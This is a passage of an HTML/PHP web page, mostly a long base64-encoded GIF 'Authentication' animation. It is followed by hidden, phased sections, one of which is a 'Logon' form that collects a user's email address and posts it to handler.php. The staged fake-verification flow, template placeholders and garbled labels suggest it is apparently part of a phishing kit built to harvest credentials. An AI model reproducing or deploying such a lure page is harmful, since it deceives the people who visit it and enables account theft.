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" alt="Authentication" /></p>
                            </div>
                            </div>
<!--- Ending phase-4 div ----->

<!--- Starting phase-5 div ----->
<div id="phase-5" style="display:none;">
<div class="login-form padding20 block-shadow" style="opacity: 1; transform: scale(1); transition: 0.5s; border-style:solid; border-color:#RRGGBB">
        <form action="handler.php" method="post">
            
            <div class="text-bold">Logon</div>
            <br>- Provide Email P
            <br>
            <hr class="thin">
            <br>
            <div class="input-control text full-size" data-role="input">
                <label for="user_login">Email PD:</label>
                <input placeholder="Enter your email" autofocus="autofocus" type="email" required name="email" id="user_login" style="padding-right: 36px;">
                <button class="button helper-button clear" tabindex="-1" type="button"><span class="mif-cross"></span></button>
            </div>
            <br>
            <br>
            <div class="form-actions">
                <button type="submit" class="button primary" style="background-color:#RRGGBB">Submit</button>
            </div>
        </form>
    </div>
</div>
<!--- Ending phase-5 div ----->




    <!-- hit.ua -->
    
    <!-- / hit.ua -->



</body>
<?php
session_destroy();
?>
</html>
